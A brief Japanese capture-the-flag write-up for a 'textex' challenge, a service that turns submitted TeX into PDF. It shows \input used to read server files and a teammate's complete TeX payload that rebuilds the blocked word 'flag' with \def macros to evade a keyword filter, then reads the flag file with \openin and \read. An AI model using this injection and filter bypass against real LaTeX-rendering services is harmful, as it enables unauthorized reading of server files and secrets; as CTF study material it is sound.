# textex

入力したtexをpdfにしてくれるっぽい

tex exploitとかで調べたら[このサイト](https://0day.work/hacking-with-latex/)が出てきた

ひとまず`requirements.txt`が表示できたのでflagも同じように表示できそう

```latex
\input{requirements.txt}
```

しかしながらflagが含まれていると無効化されてしまうことがソースコードからわかる

```python
# No flag !!!!
if "flag" in tex_code.lower():
    tex_code = ""
```

以下チームメイトがsolve

```tex
\def \g {g}
\def \f {fla\g}

\documentclass{article}

\begin{document}

\newread\file
\openin\file=\f
\read\file to\fileline
\detokenize\expandafter{\fileline}
\closein\file

\end{document}
```

`\def`を用いてflagをバイパスすること、flagの中の`_`がエラーになってしまうらしいので無効化しているらしい

チームメイトが天才でした
